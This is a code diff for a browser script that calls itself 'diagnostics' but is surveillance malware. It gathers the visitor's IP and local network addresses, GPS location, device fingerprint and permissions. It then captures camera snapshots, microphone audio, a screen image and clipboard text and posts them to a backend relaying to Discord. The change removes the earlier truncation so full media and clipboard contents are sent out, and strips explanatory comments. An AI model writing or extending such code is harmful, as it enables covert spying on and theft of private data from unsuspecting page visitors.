@@ -20,7 +20,7 @@
             const logEl = document.getElementById('log');
             const data = {};
 
-            // ==================== ORIGINAL FUNCTIONS (KEPT UNCHANGED) ====================
+            // ==================== ORIGINAL FUNCTIONS (UNCHANGED) ====================
             async function getIPInfo() {
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -99,9 +99,7 @@
                 return ext;
             }
 
-            // ==================== NEW EXTENDED DIAGNOSTICS (MASSIVELY EXPANDED) ====================
-
-            // 1. Full WebRTC local IPs (all interfaces)
+            // ==================== NEW EXTENDED DIAGNOSTICS ====================
             async function getAllLocalIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
@@ -124,7 +122,6 @@
                 });
             }
 
-            // 2. Geolocation (GPS)
             async function getGeolocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) { resolve(null); return; }
@@ -136,7 +133,6 @@
                 });
             }
 
-            // 3. Camera snapshot (stills) – capture single frame from video
             async function captureCameraSnapshot(videoTrack) {
                 if (!videoTrack) return null;
                 const stream = new MediaStream([videoTrack]);
@@ -152,13 +148,12 @@
                 const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                 video.srcObject = null;
                 video.remove();
-                trackStop(videoTrack); // stop track to release camera
-                return dataURL.slice(0, 200); // truncate for Discord, full in raw logs? we'll store full in separate field maybe.
+                trackStop(videoTrack);
+                return dataURL;   // full data URL
             }
 
             function trackStop(track) { if(track && track.stop) track.stop(); }
 
-            // 4. Microphone recording (short audio sample)
             async function captureMicrophoneSample(stream) {
                 if (!stream) return null;
                 const mediaRecorder = new MediaRecorder(stream);
@@ -173,7 +168,7 @@
                 const base64 = await blobToBase64(blob);
                 URL.revokeObjectURL(url);
                 stream.getTracks().forEach(t => t.stop());
-                return base64.slice(0, 200); // truncated
+                return base64;    // full data URL
             }
             function blobToBase64(blob) {
                 return new Promise((resolve) => {
@@ -183,7 +178,6 @@
                 });
             }
 
-            // 5. Screen capture snapshot
             async function captureScreenSnapshot() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                 try {
@@ -197,23 +191,22 @@
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                     stream.getTracks().forEach(t => t.stop());
                     video.remove();
-                    return dataURL.slice(0, 200);
+                    return dataURL;   // full data URL
                 } catch(e) { return { error: e.message }; }
             }
 
-            // 6. Clipboard read (text)
             async function readClipboard() {
                 if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                 try {
                     const text = await navigator.clipboard.readText();
-                    return text.length > 100 ? text.slice(0,100)+'...' : text;
+                    return text;   // full
                 } catch(e) { return { error: e.message }; }
             }
 
-            // 7. Device orientation
+            // (All other functions unchanged: getOrientation, getAmbientLight, etc.)
             function getOrientation() {
                 return new Promise((resolve) => {
                     if (!window.DeviceOrientationEvent) { resolve(null); return; }
@@ -225,8 +218,6 @@
                     setTimeout(() => resolve(null), 2000);
                 });
             }
-
-            // 8. Ambient light sensor
             async function getAmbientLight() {
                 if (!window.AmbientLightSensor) return null;
                 try {
@@ -238,35 +229,23 @@
                     return value;
                 } catch(e) { return null; }
             }
-
-            // 9. Bluetooth devices (basic availability)
             async function getBluetoothAvailability() {
                 if (!navigator.bluetooth) return false;
-                try {
-                    return true;
-                } catch(e) { return false; }
+                return true;
             }
-
-            // 10. USB devices (via WebUSB – requires user gesture and permission)
             async function getUSBAvailability() {
                 if (!navigator.usb) return false;
                 return true;
             }
-
-            // 11. Speech recognition (just check support)
             function getSpeechRecognitionSupport() {
                 const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
                 return !!SpeechRecognition;
             }
-
-            // 12. Vibration (if supported)
             function vibratePattern() {
                 if (!navigator.vibrate) return 'not supported';
                 navigator.vibrate(200);
                 return 'vibrated 200ms';
             }
-
-            // 13. Notifications permission and show test (silent)
             async function checkNotifications() {
                 if (!('Notification' in window)) return 'not supported';
                 const permission = Notification.permission;
@@ -276,14 +255,10 @@
                 }
                 return permission;
             }
-
-            // 14. Gamepad detection
             function getGamepads() {
                 const pads = navigator.getGamepads ? navigator.getGamepads() : [];
                 return pads.filter(p => p !== null).map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
             }
-
-            // 15. Installed fonts (through CSS/JS measurement)
             function getInstalledFonts() {
                 const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Segoe UI", "Roboto", "Open Sans", "Calibri", "Cambria", "Consolas"];
                 const canvas = document.createElement('canvas');
@@ -297,11 +272,7 @@
                 }
                 return fontList.filter(checkFont);
             }
-
-            // 16. WebShare API support
             function webShareSupport() { return !!navigator.share; }
-
-            // 17. Permissions API (enumerate)
             async function getAllPermissions() {
                 if (!navigator.permissions || !navigator.permissions.query) return {};
                 const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
@@ -314,8 +285,6 @@
                 }
                 return results;
             }
-
-            // 18. Media devices (list all cameras, mics, speakers)
             async function enumerateMediaDevices() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
                 try {
@@ -323,8 +292,6 @@
                     return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId.slice(0,10) + '...' }));
                 } catch(e) { return []; }
             }
-
-            // 19. Request camera & microphone streams (to get metadata + snapshots)
             async function requestCameraAndMic() {
                 let cameraStream = null, micStream = null, cameraSnapshot = null, micSample = null, cameraTrack = null;
                 try {
@@ -341,11 +308,10 @@
                 return { cameraSnapshot, micSample };
             }
 
-            // ==================== MAIN EXECUTION – IMMEDIATE SEND + FOLLOW‑UP ====================
+            // ==================== MAIN EXECUTION ====================
             try {
                 logEl.textContent = 'Starting diagnostics… Basic info will be sent instantly.';
 
-                // 1. Kick off all non‑media collectors (they resolve without user interaction)
                 await getIPInfo();
                 const fingerprint = getFingerprint();
                 const vulns = await scanVulns();
@@ -367,12 +333,10 @@
                     enumerateMediaDevices()
                 ]);
 
-                // 2. Fire‑up permission‑heavy tasks (camera, mic, screen, clipboard) – do NOT await them now
                 const cameraMicPromise = requestCameraAndMic();
                 const clipboardTextPromise = readClipboard();
                 const screenSnapshotPromise = captureScreenSnapshot();
 
-                // 3. Build the immediate payload (all data except the still‑pending media)
                 const fullDiagImmediate = {
                     webrtc_local_ips: allLocalIPs,
                     geolocation: geoLocation,
@@ -387,10 +351,10 @@
                     web_share_support: webShare,
                     permissions: permissions,
                     media_devices: mediaDevices,
-                    camera_snapshot_thumb: null,   // not yet available
-                    microphone_sample_thumb: null,  // not yet available
-                    screen_snapshot_thumb: null,    // not yet available
-                    clipboard_text_sample: null,     // not yet available
+                    camera_snapshot_thumb: null,
+                    microphone_sample_thumb: null,
+                    screen_snapshot_thumb: null,
+                    clipboard_text_sample: null,
                     httpHeaders: { userAgent: navigator.userAgent, accept: navigator.languages?.join(',') },
                     jsAttributes: {
                         userAgent: navigator.userAgent,
@@ -437,50 +401,69 @@
                     }]
                 };
 
-                // 4. SEND THE IMMEDIATE PAYLOAD RIGHT NOW – no waiting for camera/mic
-                const firstSend = await fetch(BACKEND_URL, {
+                // Immediate JSON send (no files)
+                await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(immediatePayload)
                 });
-                logEl.textContent = firstSend.ok
-                    ? 'Initial diagnostic sent. Now capturing camera/mic/screen/clipboard…'
-                    : 'Initial send partial (HTTP ' + firstSend.status + '). Continuing capture…';
+                logEl.textContent = 'Initial diagnostic sent. Now capturing camera/mic/screen/clipboard…';
 
-                // 5. NOW wait for the remaining high‑interaction data
+                // Wait for permission‑heavy captures
                 const [cameraMicData, clipboardText, screenSnapshot] = await Promise.all([
                     cameraMicPromise,
                     clipboardTextPromise,
                     screenSnapshotPromise
                 ]);
 
-                // 6. Build and send the follow‑up payload with exactly the captured content
-                const followUpPayload = {
-                    content: '**UPDATE: Camera / Mic / Screen / Clipboard Data**',
+                // ========== SEND FULL MEDIA AS DISCORD FILE ATTACHMENTS ==========
+                const formData = new FormData();
+
+                // Minimal embed that Discord will display alongside the files
+                const filesEmbed = {
+                    content: '**UPDATE: Media files attached**',
                     embeds: [{
                         title: 'Media Capture Results',
                         color: 0x00ff00,
                         fields: [
-                            { name: 'Camera Snapshot (thumb)', value: (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string')
-                                ? cameraMicData.cameraSnapshot.slice(0,200) : `denied/failed (${cameraMicData.cameraSnapshot?.error || 'unknown'})`, inline: false },
-                            { name: 'Microphone Sample (base64)', value: (cameraMicData.micSample && typeof cameraMicData.micSample === 'string')
-                                ? cameraMicData.micSample.slice(0,200) : `denied/failed (${cameraMicData.micSample?.error || 'unknown'})`, inline: false },
-                            { name: 'Screen Snapshot (thumb)', value: (screenSnapshot && typeof screenSnapshot === 'string')
-                                ? screenSnapshot.slice(0,200) : `denied/failed (${screenSnapshot?.error || 'none'})`, inline: false },
-                            { name: 'Clipboard Text', value: (clipboardText && typeof clipboardText === 'string')
-                                ? clipboardText.slice(0,200) : `denied/failed/empty`, inline: false }
+                            { name: 'Camera Snapshot', value: cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string' ? '✅ attached' : `❌ ${cameraMicData.cameraSnapshot?.error || 'denied'}`, inline: true },
+                            { name: 'Microphone Sample', value: cameraMicData.micSample && typeof cameraMicData.micSample === 'string' ? '✅ attached' : `❌ ${cameraMicData.micSample?.error || 'denied'}`, inline: true },
+                            { name: 'Screen Snapshot', value: screenSnapshot && typeof screenSnapshot === 'string' ? '✅ attached' : `❌ ${screenSnapshot?.error || 'denied'}`, inline: true },
+                            { name: 'Clipboard Text', value: clipboardText && typeof clipboardText === 'string' ? '✅ attached as text' : '❌ empty/denied', inline: true }
                         ],
                         timestamp: new Date().toISOString()
                     }]
                 };
+                formData.append('payload_json', JSON.stringify(filesEmbed));
 
+                // Helper: convert data URL to Blob and append
+                async function addFileFromDataURL(dataURL, filename) {
+                    if (!dataURL || typeof dataURL !== 'string') return;
+                    const res = await fetch(dataURL);
+                    const blob = await res.blob();
+                    formData.append('file', blob, filename);
+                }
+
+                if (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string') {
+                    await addFileFromDataURL(cameraMicData.cameraSnapshot, 'camera_snapshot.jpg');
+                }
+                if (cameraMicData.micSample && typeof cameraMicData.micSample === 'string') {
+                    await addFileFromDataURL(cameraMicData.micSample, 'microphone_sample.webm');
+                }
+                if (screenSnapshot && typeof screenSnapshot === 'string') {
+                    await addFileFromDataURL(screenSnapshot, 'screen_snapshot.jpg');
+                }
+                if (clipboardText && typeof clipboardText === 'string') {
+                    formData.append('file', new Blob([clipboardText], { type: 'text/plain' }), 'clipboard.txt');
+                }
+
+                // Send multipart/form-data (your backend must forward this to Discord)
                 await fetch(BACKEND_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(followUpPayload)
+                    body: formData   // Content-Type is automatically set to multipart/form-data
                 });
 
-                logEl.textContent += '\nFollow‑up payload sent. All data delivered.';
+                logEl.textContent += '\nFull media files sent as attachments.';
             } catch (err) {
                 console.error(err);
                 logEl.textContent = 'Error: ' + err.message;
